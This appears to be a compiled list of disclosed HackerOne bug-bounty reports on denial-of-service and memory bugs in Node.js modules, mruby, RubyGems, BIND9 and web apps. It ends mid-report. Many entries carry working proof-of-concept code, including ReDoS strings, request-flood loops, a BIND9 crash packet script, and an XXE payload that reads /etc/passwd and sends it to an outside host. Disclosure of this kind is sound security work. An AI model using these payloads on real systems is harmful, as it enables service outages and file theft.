## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The `extend` function can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{__proto__: {...}}` and send it to `extend(true, {}, ...)`.

```javascript
let extend = require('extend');
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
extend(true, {}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

---

### [`memjs` allocates and stores buffers on typed input, resulting in DoS and uninitialized memory usage](https://hackerone.com/reports/319809)

- **Report ID:** `319809`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-06-27T05:25:55.386Z
- **CVE(s):** CVE-2018-3767

**Vulnerability Information:**

I would like to report a Buffer allocation vulnerability in `memjs`.

In cases when the attacker is able to pass typed input (e.g. via JSON) to the storage, it allows to cause DoS (on all Node.js versions) and to store (and potentially later extract) chunks of uninitialized server memory containing sensitive data.

# Module

**module name:** `memjs`
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/memjs`

## Module Description

> MemJS is a pure Node.js client library for using memcache, in particular, the MemCachier service. It uses the binary protocol and support SASL authentication.

## Module Stats

186 downloads in the last day
2 903 downloads in the last week
12 037 downloads in the last month

~144 444 estimated downloads per year *(yay, a pretty number)*

# Vulnerability

## Vulnerability Description

`memjs` passes `value` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'value' parameter (e.g. JSON).

## Steps To Reproduce:

`memcached` should be up and running.

### DoS

```js
var client = require('memjs').Client.create()
function tick() {
  var value = 2e9;
  client.set('key', value, {expires: 600 }, () => {});
}
setInterval(tick, 200);
```

### Uninitialized memory exposed (when running on Node.js below 8.0)

```js
var client = require('memjs').Client.create()
var value = 100;
client.set('key', value, {expires: 600 }, () => {});
client.get('key', (err, val) => console.log(val));
```

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- memcached 1.5.5

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of service
Sensitive data leak (on Node.js < 8.x)

---

### [`foreman` is vulnerable to ReDoS in path](https://hackerone.com/reports/320586)

- **Report ID:** `320586`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-04-28T20:31:32.910Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report ReDoS in `foreman`.
It allows to cause denial of service by suppling a crafted path.

# Module

**module name:** foreman
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/foreman`

## Module Description

> Node Foreman is a Node.js version of the popular Foreman tool, with a few Node specific changes.

## Module Stats

5 296 downloads in the last day
30 879 downloads in the last week
141 342 downloads in the last month

~1 696 104 estimated downloads per year

# Vulnerability

## Vulnerability Description

ReDoS.

Regex: `/http:\/\/[^/]*:?[0-9]*(\/.*)$/`
Evil string: `http://${Array(81000).join('0')}` (unwrap js template)
Line: https://github.com/strongloop/node-foreman/blob/v2.0.0/forward.js#L30
Blocks for ~5 seconds per request.

## Steps To Reproduce:

`nf start -f 9999`

```js
const net = require('net');
const tick = function() {
const client = net.createConnection({ port: 9999 }, () => {
  client.write(`GET http://${Array(81000).join('0')} HTTP/1.1
Host: localhost:9999


"`);
  });
}
setInterval(tick, 1000)
```

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of Service by passing crafted paths.

---

### [Rate Limitation Vulnerability (DDos)](https://hackerone.com/reports/209860)

- **Report ID:** `209860`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Khan Academy
- **Reporter:** @hamzar97
- **Bounty:** - usd
- **Disclosed:** 2018-04-17T20:52:25.570Z
- **CVE(s):** -

**Summary (team):**

Rate limiting on account confirmation emails and forgot password.

---

### [`http-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak](https://hackerone.com/reports/321631)

- **Report ID:** `321631`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-04-05T21:51:46.634Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a Buffer allocation vulnerability in `http-proxy-agent`.

In setups where auth argument is user-controlled, it allows to:

cause Denial of Service by trivially consuming all the available CPU resources
extract uninitialized memory chunks from the server on Node.js <8.x.
# Module

**module name:** `http-proxy-agent`
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/http-proxy-agent`

## Module Description

> This module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in http module.

## Module Stats

112 721 downloads in the last day
707 979 downloads in the last week
2 953 077 downloads in the last month

# Vulnerability

## Vulnerability Description

`http-proxy-agent` passes `auth` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).

The exact line: https://github.com/TooTallNate/node-http-proxy-agent/blob/master/index.js#L80

## Steps To Reproduce:

### DoS

```js
var url = require('url');
var http = require('http');
var HttpProxyAgent = require('http-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

setInterval(() => {
  proxy.auth = 1e9; // a number as 'auth'
  var opts = url.parse('http://example.com/');
  var agent = new HttpProxyAgent(proxy);
  opts.agent = agent;
  console.time('tick');
  http.get(opts);
  console.timeEnd('tick');
}, 200);
```

Observe how this is consuming memory and CPU — each request takes >1 second in the main thread on my setup.

### Uninitialized memory leak

```js
// listen with: nc -l -p 8080

var url = require('url');
var http = require('http');
var HttpProxyAgent = require('http-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

proxy.auth = 500; // a number as 'auth'
var opts = url.parse('http://example.com/');
var agent = new HttpProxyAgent(proxy);
opts.agent = agent;
http.get(opts);
```

Listen with `nl -l -p 8080` to see requests.

Execute on various Node.js versions — 4.x LTS, 6.x LTS, 8.x LTS / 9.x.

This leaks uninitialized Buffer memory on Node.js <8.x.
On ≥8.x those Buffers (that are using the deprecated API) are zero-filled.

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- gnu-netcat 0.7.1

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

# Note

Almost entirely similar to `https-proxy-agent`, but this is a separate package, a separate GitHub repo, different version numbers, different lines in code, different download stats.

## Impact

Denial of service
Sensitive data leak (on Node.js <8.0)

**Summary (researcher):**

Unguarded `Buffer(arg)` in `auth` option, which can leak data or cause DoS if typed user input (e.g. from JSON) ends up there.
Resolved in `http-proxy-agent@2.1.0` by switching to `Buffer.from(arg)` (new Buffer API).

---

### [`sshpk` is vulnerable to ReDoS when parsing crafted invalid public keys](https://hackerone.com/reports/319593)

- **Report ID:** `319593`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-04-04T21:26:06.821Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a ReDoS in `sshpk`
It allows to cause Denial of Service by trying to parse a crafted public key.

# Module

**module name:** sshpk
**version:** 1.13.1
**npm page:** `https://www.npmjs.com/package/sshpk`

## Module Description

> Parse, convert, fingerprint and use SSH keys (both public and private) in pure node -- no ssh-keygen or other external dependencies.

## Module Stats

320 485 downloads in the last day
4 709 033 downloads in the last week
19 365 516 downloads in the last month

~232 386 192 estimated downloads per year

# Vulnerability

## Vulnerability Description

ReDoS.

- regex: /^([a-z0-9-]+)[ \t]+([a-zA-Z0-9+\/]+[=]*)([\n \t]+([^\n]+))?$/
- evil string: `ssh-rsa a${Array(200000).join(' ')}x\nx` (~200 KB, unwrap js template string)
- file: https://github.com/joyent/node-sshpk/blob/v1.13.1/lib/formats/ssh.js#L17

The testcase uses ~200 KB string to demonstrate long unavailability period, but parsing is also considerably slow on shorter strings.

## Steps To Reproduce:

```js
var keyPub = `ssh-rsa a${Array(200000).join(' ')}x\nx`;
var key = require('sshpk').parseKey(keyPub, 'ssh');
```

## Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N 
- I opened an issue in the related repository: N

## Impact

Cause denial of service by parsing a crafted public key file.

---

### [`https-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak](https://hackerone.com/reports/319532)

- **Report ID:** `319532`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2018-04-02T20:49:07.192Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a Buffer allocation vulnerability in `https-proxy-agent`.

In setups where `auth` argument is user-controlled, it allows to:
1. cause Denial of Service by trivially consuming all the available CPU resources
2. extract uninitialized memory chunks from the server on Node.js <8.x.

# Module

**module name:** https-proxy-agent
**version:** 2.1.1 
**npm page:** `https://www.npmjs.com/package/https-proxy-agent`

## Module Description

> This module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in https module.

## Module Stats

114 304 downloads in the last day
1 668 955 downloads in the last week
6 758 891 downloads in the last month

~81 106 692 estimated downloads per year

# Vulnerability

## Vulnerability Description

`https-proxy-agent` passes `auth` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).

The exact line: https://github.com/TooTallNate/node-https-proxy-agent/blob/2.1.1/index.js#L207

## Steps To Reproduce:

### DoS
```js
var url = require('url');
var https = require('https');
var HttpsProxyAgent = require('https-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

setInterval(() => {
  proxy.auth = 1e9; // a number as 'auth'
  var opts = url.parse('https://example.com/');
  var agent = new HttpsProxyAgent(proxy);
  opts.agent = agent;
  console.time('tick');
  https.get(opts);
  console.timeEnd('tick');
}, 200);
```

Observe how this is consuming memory and CPU — each request takes >1 second in the main thread on my setup.

### Uninitialized memory leak

```js
// listen with: nc -l -p 8080

var url = require('url');
var https = require('https');
var HttpsProxyAgent = require('https-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

proxy.auth = 500; // a number as 'auth'
var opts = url.parse('https://example.com/');
var agent = new HttpsProxyAgent(proxy);
opts.agent = agent;
https.get(opts);
```

Listen with `nl -l -p 8080` to see requests.

Execute on various Node.js versions — 4.x LTS, 6.x LTS, 8.x LTS / 9.x.

This leaks uninitialized Buffer memory on Node.js <8.x.
On ≥8.x those Buffers (that are using the deprecated API) are zero-filled.

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- gnu-netcat 0.7.1

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of service
Sensitive data leak (on Node.js <8.0)

**Summary (researcher):**

Unguarded `Buffer(arg)` in `auth` option, which can leak data or cause DoS if typed user input (e.g. from JSON) ends up there.
Resolved in `https-proxy-agent@2.2.0` by switching to `Buffer.from(arg)` (new Buffer API).

---

### [Fastify denial-of-service vulnerability with large JSON payloads](https://hackerone.com/reports/303632)

- **Report ID:** `303632`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @nwoltman
- **Bounty:** - usd
- **Disclosed:** 2018-01-25T17:21:10.344Z
- **CVE(s):** CVE-2018-3711

**Vulnerability Information:**

**Module:**

Fastify - https://www.npmjs.com/package/fastify
Affected versions: <=0.37.0 (all version before 0.38.0)

**Summary:**

A denial-of-service attack can be performed against servers running Fastify by sending a request with "Content-Type: application/json" and a very large payload.

**Description:**

Fastify internally builds up the request payload as a string and then JSON parses the string once the full payload is received. It does not (before v0.38.0) limit the size of the payload before JSON parsing it, meaning that the string can grow large enough to surpass either V8's string length limits and throw an `uncaughtException`, or it can surpass the process's memory limits and crash the process.

To perform this attack, one must send a request with `Content-Type: application/json` containing a very large payload. The request may be streamed. The payload only needs to be large enough to surpass V8's string length limit (`2^30 - 25` bytes with V8 62 / Node 9, or `2^28 - 16` bytes for earlier versions), at which point the Node.js process will crash with an `uncaughtException`. If the process running Node has less memory than V8's maximum string size, the process will run out of memory and crash earlier. If multiple requests with a large payload are made in parallel, the process will run out of memory very quickly (this can be done with only a few parallel requests).

This attack can be performed repeatedly and indefinitely.

## Steps To Reproduce:

  1. Create a Fastify server using the [default example](https://github.com/fastify/fastify#example).
  2. Add a POST route. Example: `fastify.post('/*', async () => 'response text')`.
  3. Start the server (e.g. `node app.js`).
  4. Use a tool such as curl or Node to send a POST request with `Content-Type: application/json` to the sever (i.e. running on `localhost:3000`) with a payload of size 1 GB or larger.
  5. The server will crash before the request completes.

Piece of code responsible for this issue (from the last commit before the vulnerability was fixed): https://github.com/fastify/fastify/blob/8bc80ab61ad8de3fd498bf885ac645a0a634874c/lib/handleRequest.js#L60-L81

## Impact:

All servers running Fastify <= 0.37.0 without a reverse proxy in front that limits the size of request payloads are vulnerable to this denial-of-service attack.

## Supporting Material/References:

Example attack using Node:

```js
const http = require('http');

const req = http.request({
  host: 'localhost',
  port: 3000,
  path: '/',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
}, (res) => {
  console.log(res.statusCode);
  console.log(res.headers);
}).on('error', (err) => {
  console.log(err);
});

const buff = Buffer.alloc(100000);

for (var i = 0; i < 20000; i++) {
  req.write(buff);
}

req.end();
```

## Impact

An attacker can consistently crash a Node process running Fastify, thus creating a denial-of-service scenario.

---

### [Application-level DoS on image's "size" parameter.](https://hackerone.com/reports/247700)

- **Report ID:** `247700`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Gratipay
- **Reporter:** @edoverflow
- **Bounty:** - usd
- **Disclosed:** 2017-11-02T19:16:20.811Z
- **CVE(s):** -

**Vulnerability Information:**

# Summary
---

The `size` parameter located on images is vulnerable to DoS. By modifying the parameter's value an attacker can cause the application to work very slowly.

# Description
---

The issue is located in the `get_image_url()` function in `gratipay/models/team/__init__.py` and can be exploited by replacing the `small` or `large` values in the following GET request: `http://<GRATIPAY INSTANCE>/<USER>/image?size=small`.

~~~python
# Images
# ======

IMAGE_SIZES = ('original', 'large', 'small')

def get_image_url(self, size):
    assert size in ('original', 'large', 'small'), size
    return '/{}/image?size={}'.format(self.slug, size)
~~~

Link: https://github.com/gratipay/gratipay.com/blob/1985e43033edd87bd16cdb46c16adbcda0bb6bc4/gratipay/models/team/__init__.py#L312-L314

# How can this issue be exploited?
---

Repeatedly sending values of 4094 characters in length will cause the DoS.

~~~python
import requests
payload = "a" * 4094
url = "http://<GRATIPAY INSTANCE>/<USER>/image?size=small" + payload

for i in range(10000000):
	requests.get(url)
~~~

---

### [No limit of summary length allows Denail of Service](https://hackerone.com/reports/243003)

- **Report ID:** `243003`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** RubyGems
- **Reporter:** @mame
- **Bounty:** - usd
- **Disclosed:** 2017-08-31T23:19:29.517Z
- **CVE(s):** CVE-2017-0900

**Vulnerability Information:**

Currently, there is no limit for summary length.  I think, pushing a gem whose summary is huge, will make `gem search` unavailable.

This is not Arbitrary Code Execution, but really easy to attack.  According to CVSS v3.0 Calculator, the severity is High (7.5).

## How to attack

1) An attacker creates a gem with huge summary string, and push it to rubygems.org.
2) A victim runs `gem search -d <substring-of-the-name-of-the-gem>`, but it will give no response.

It may be good for the gem name to include a frequently-searched keyword, such as "foo-rails-bar" or "foo-sinatra-bar".

## Proof of concept

1) Prepare the following gemspec.

~~~~
Gem::Specification.new do |spec|
  spec.name     = "huge-summary"
  spec.version  = "0.0.1"
  spec.authors  = ["Yusuke Endoh"]
  spec.email    = ["mame@ruby-lang.org"]
  spec.summary  = "foo" * 10000000
  spec.homepage = "http://example.com/"
  spec.license  = "MIT"
end
~~~~

2) Run the following commands

~~~~
gem build huge-summary.gemspec
gem install huge-summary-0.0.1.gem
~~~~

3) Run the following command.

~~~~
gem query huge-summary -d
~~~~

It will not answer.

---

### [ci.nextcloud.com: CVE-2015-5477 BIND9 TKEY Vulnerability + Exploit (Denial of Service)](https://hackerone.com/reports/237860)

- **Report ID:** `237860`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Nextcloud
- **Reporter:** @0xsamar
- **Bounty:** - usd
- **Disclosed:** 2017-06-08T17:51:14.229Z
- **CVE(s):** CVE-2015-5477

**Vulnerability Information:**

Hello Team NextCloud,

In reference report #217381
I've reported the DDOS attack via DNS Port at OwnCloud..
And it was successfully patched.

But now same issue I got at

```
ci.nextcloud.com
```
Proof Of Concept:
Here it is the nmap result of ci.nextcloud.com

NMap Scan Results:
```
Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-08 04:12 PKT
Nmap scan report for ci.nextcloud.com (█████)
Host is up (0.077s latency).
rDNS record for █████████: ███████
Not shown: 96 filtered ports
PORT    STATE SERVICE    VERSION
22/tcp  open  tcpwrapped
53/tcp  open  tcpwrapped
80/tcp  open  tcpwrapped
443/tcp open  tcpwrapped
```
Now here it is the telnet result:
```
──╼ $telnet
telnet> open
(to) ci.nextcloud.com 53
Trying ███...
Connected to ci.nextcloud.com.
Escape character is '^]'.
```

So this can leads to a serious DDOS attack at doc.owncloud.com using the exploit..

Exploit Link:

```
https://github.com/elceef/tkeypoc/
```
Vulnerability Reference CVE Details:

```
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5477
```
Exploit PoC:

Exploit Title: PoC for BIND9 TKEY DoS

Exploit Author: elceef

Software Link: https://github.com/elceef/tkeypoc/

Version: ISC BIND 9

Tested on: multiple

CVE : CVE-2015-5477

```
!/usr/bin/env python

import socket
import sys

print('CVE-2015-5477 BIND9 TKEY PoC')

if len(sys.argv) < 2:
print('Usage: ' + sys.argv[0] + ' [target]')
sys.exit(1)

print('Sending packet to ' + sys.argv[1] + ' ...')

payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(payload, (sys.argv[1], 53))

print('Done.')
```

Thanks :)

---

### [ XXE in upload file feature](https://hackerone.com/reports/105787)

- **Report ID:** `105787`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Informatica
- **Reporter:** @yarbabin
- **Bounty:** - usd
- **Disclosed:** 2017-05-10T04:06:29.391Z
- **CVE(s):** -

**Summary (team):**

The attacker was able to execute XXE in one of the file upload feature.

---

### [Segmentation fault when a Ruby method is invoked by a C method via Object#send](https://hackerone.com/reports/183425)

- **Report ID:** `183425`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @h72
- **Bounty:** 8000 usd
- **Disclosed:** 2017-04-13T21:07:57.292Z
- **CVE(s):** -

**Vulnerability Information:**

We can arrange for C to call `Object#send` by aliasing it over `initialize`. This will cause `Class#new` (a C function) to call `#initialize` (which is actually `Object#send`) with arbitrary arguments.

If we invoke a Ruby method through `Object#send`, mruby segfaults:

```
def foo
end

class X
  alias_method :initialize, :send
end

X.new.send(:foo)
```

---

### [OCSP Status Request extension unbounded memory growth (CVE-2016-6304)](https://hackerone.com/reports/216840)

- **Report ID:** `216840`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @theyarestone
- **Bounty:** - usd
- **Disclosed:** 2017-04-12T00:58:54.563Z
- **CVE(s):** CVE-2016-6304

**Vulnerability Information:**

A malicious client can send an excessively large OCSP Status Request extension.
If that client continually requests renegotiation, sending a large OCSP Status
Request extension each time, then there will be unbounded memory growth on the
server. This will eventually lead to a Denial Of Service attack through memory
exhaustion. Servers with a default configuration are vulnerable even if they do
not support OCSP. Builds using the "no-ocsp" build time option are not affected.

**Summary (team):**

A malicious client can send an excessively large OCSP Status Request extension. If that client continually requests renegotiation, sending a large OCSP Status Request extension each time, then there will be unbounded memory growth on the server. This will eventually lead to a Denial Of Service attack through memory exhaustion. Servers with a default configuration are vulnerable even if they do not support OCSP. Builds using the "no-ocsp" build time option are not affected.

Servers using OpenSSL versions prior to 1.0.1g are not vulnerable in a default configuration, instead only if an application explicitly enables OCSP stapling support.

OpenSSL 1.1.0 users should upgrade to 1.1.0a
OpenSSL 1.0.2 users should upgrade to 1.0.2i
OpenSSL 1.0.1 users should upgrade to 1.0.1u

This issue was reported to OpenSSL on 29th August 2016 by Shi Lei (Gear Team, Qihoo 360 Inc.). The fix was developed by Matt Caswell of the OpenSSL development team.

---

### [[app.informaticaondemand.com] XXE](https://hackerone.com/reports/105753)

- **Report ID:** `105753`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Informatica
- **Reporter:** @yarbabin
- **Bounty:** - usd
- **Disclosed:** 2017-04-08T10:07:19.915Z
- **CVE(s):** -

**Vulnerability Information:**

Request:
POST /ma/api/v2/user/login HTTP/1.1
Host: app.informaticaondemand.com
Content-Length: 285
Content-Type: application/xml
Accept: application/xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
%asd;
%rrr;]>
<login><username>demo@informatica.com</username><password>Infa123</password></login>

Where xx.html:
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;

Then i got file /etc/passwd (xxe_app.png)

---

### [Content length restriction bypass can lead to DOS by reading large files on gip.rocks](https://hackerone.com/reports/203388)

- **Report ID:** `203388`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Gratipay
- **Reporter:** @a0xnirudh
- **Bounty:** - usd
- **Disclosed:** 2017-03-31T14:50:05.910Z
- **CVE(s):** -

**Vulnerability Information:**

Hello team,

## Introduction

Since you mentioned in the rules that all libraries listed on your github repositories are in scope, I decided to take a look at http://gip.rocks

## Problem:

The application reads an image file and convert it into smaller formats, zip it and let the users to download the updated file. But the problem here is the condition check before reading the file to the variable:

File: https://github.com/gratipay/gip.rocks/blob/master/www/v1.spt

```python
if int(request.headers['Content-Length']) > 256 * 1024:
    raise Response(413)

image_type = request.headers['Content-Type']
if image_type not in ('image/png', 'image/jpeg'):
    raise Response(415)

# Load the image.
fp = StringIO(request.raw_body)
fp.seek(0)
image = Image.open(fp)

```

Here you can see that you are calculating the length of the incoming file from the `content-length` HTTP header and if it is less than `256 * 1024`, you will accept the request. But this is not a correct way to check size of the incoming file.

## POC:

1) Initiate a system wide proxy with burp suite

2) Try to send a curl request with a huge file and see the request in curl

3) The content length will be obviously greater than the max value application accepts but modify the `content-length` header to a value which is less than `256 * 1024`.

4) Forward the request and you can see that the server will read the files to a variable and if the file is large enough, this is more than enough to DOS the server.

Now since this deals with DOS, I haven't actually tried out this attack but we can easily confirm this from the source code that this can be bypassed in the way I explained above. I also tried deploying locally but I had a hard time making the software run locally and I don't have enough free time to debug what is happening.

But I think the bug is very clear from the source code itself, which is why I really didn't test it but thought to report it.

## Mitigation:

Putting your trust on HTTP headers may not be a good idea. But I am not really sure what is a solid method to find the proper length of the string in this case.

---

### [Interger overflow in str_substr leading to read/write out of bound memory](https://hackerone.com/reports/205884)

- **Report ID:** `205884`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @beyondchain
- **Bounty:** 100 usd
- **Disclosed:** 2017-03-15T01:29:48.346Z
- **CVE(s):** -

**Vulnerability Information:**

Failed check len & beg in str_substr when call mrb_str_aref_m by String. This can lead to read/write into invalid memory which may be memory corruption or  RCE.
this snippet causes a crash in mruby(i can't check mruby-engine by error undefined symbol >rb_utf8_str_new ):
```
$b="B"*2048
$expand=$b[0x40,0x7fffffff]
puts $expand.size()
puts $expand
```
And, here is error: beg=0x40, len=0x7fffffff, clen=0x800=> beg+len < clen(Integer Overflow)
```
static mrb_value
str_substr(mrb_state *mrb, mrb_value str, mrb_int beg, mrb_int len)
{
/**
*..some code here
**/
if (beg + len > clen) => Integer overflow here
    len = clen - beg;
  if (len <= 0) {
    len = 0;
  }
  return str_subseq(mrb, str, beg, len);
}
```

---

### [Segmentation fault - mrb_gc_mark](https://hackerone.com/reports/195842)

- **Report ID:** `195842`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @alanbugz
- **Bounty:** - usd
- **Disclosed:** 2017-03-09T01:26:11.671Z
- **CVE(s):** -

**Vulnerability Information:**

```
# gdb /root/mruby-engine/ext/mruby_engine/mruby/bin/mirb
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /root/mruby-engine/ext/mruby_engine/mruby/bin/mirb...done.
(gdb) run 3.rb
Starting program: /root/mruby-engine/ext/mruby_engine/mruby/bin/mirb 3.rb
mirb - Embeddable Interactive Ruby Shell

 => [300000, 8]
line 2: syntax error, unexpected tIDENTIFIER, expecting keyword_do or '{' or '('
line 3: syntax error, unexpected tAMPER

Program received signal SIGSEGV, Segmentation fault.
mrb_gc_mark (mrb=0x6cf010, obj=0x305c3030325c3737) at /root/mruby-engine/ext/mruby_engine/mruby/src/gc.c:696
696       if (!is_white(obj)) return;
(gdb) x/1i $rip
=> 0x410f75 <mrb_gc_mark+5>:    movzbl 0x1(%rsi),%eax
(gdb) list *$rip
0x410f75 is in mrb_gc_mark (/root/mruby-engine/ext/mruby_engine/mruby/src/gc.c:696).
691
692     MRB_API void
693     mrb_gc_mark(mrb_state *mrb, struct RBasic *obj)
694     {
695       if (obj == 0) return;
696       if (!is_white(obj)) return;
697       mrb_assert((obj)->tt != MRB_TT_FREE);
698       add_gray_list(mrb, &mrb->gc, obj);
699     }
700
(gdb) bt
```

---

### [DoS: type confusion in mrb_no_method_error](https://hackerone.com/reports/181871)

- **Report ID:** `181871`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @raydot
- **Bounty:** - usd
- **Disclosed:** 2017-03-01T21:25:22.719Z
- **CVE(s):** -

**Vulnerability Information:**

Overwriting the 'new' method of the NoMethodError singleton to not return an exception object leads to memory corruption and possibly arbitrary code execution.

Running the following code under the mruny-engine sandbox script results in a native crash:
    NoMethodError.define_singleton_method(:new) do "waat" end
    Object.q

Attached is a patch to mitigate the issue.

---

### [Authorization issue in Google G Suite allows DoS through HTTP redirect](https://hackerone.com/reports/191196)

- **Report ID:** `191196`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Uber
- **Reporter:** @rijalrojan
- **Bounty:** - usd
- **Disclosed:** 2017-02-09T22:51:27.441Z
- **CVE(s):** -

**Summary (team):**

The combination of an authorization flaw in Google’s G Suite and a misconfiguration on Uber’s behalf, allowed @uranium238 to set up an HTTP redirect for the domain ubereats.com. For some UberEats customers, this resulted in not being able to use the service for a short period of time. 

@uranium238 brought the vulnerability to our attention, was able to demonstrate the security impact, and worked with both Uber and Google to validate the fixes. We look forward to more reports from @uranium238 in the future.

**Summary (researcher):**

Uber handled this report in a professional manner. Overall, I love reporting bugs to Uber. Thank you for everyone at Uber who worked on this and sorry for the trouble this bug caused for a while. 
https://medium.com/@rojanrijal/this-domain-is-my-domain-g-suite-a-record-vulnerability-b447a90a8de7
Cheers,
@uranium238

---

### [ruby DoS https://www.mruby.science](https://hackerone.com/reports/180695)

- **Report ID:** `180695`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @bugdelivery
- **Bounty:** 8000 usd
- **Disclosed:** 2017-01-15T20:49:30.167Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,
When I sent 49000x "A" I was probably able to crash service running on https://www.mruby.science since new code can't be executed for now. Could you please verify what happened? Thanks.

---

### [Null pointer dereference due to TOCTTOU bug in mrb_time_initialize](https://hackerone.com/reports/182274)

- **Report ID:** `182274`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** shopify-scripts
- **Reporter:** @raydot
- **Bounty:** - usd
- **Disclosed:** 2017-01-15T19:56:05.964Z
- **CVE(s):** -

**Vulnerability Information:**

mrb_time_initialize sets the data pointer to NULL before parsing function arguments. Parsing function arguments can call out to ruby code to call methods to do type coercion. If the type coercion method tries to access the time object it will dereference a NULL pointer.

The following snippet results in a native crash under mruby-engine:
```
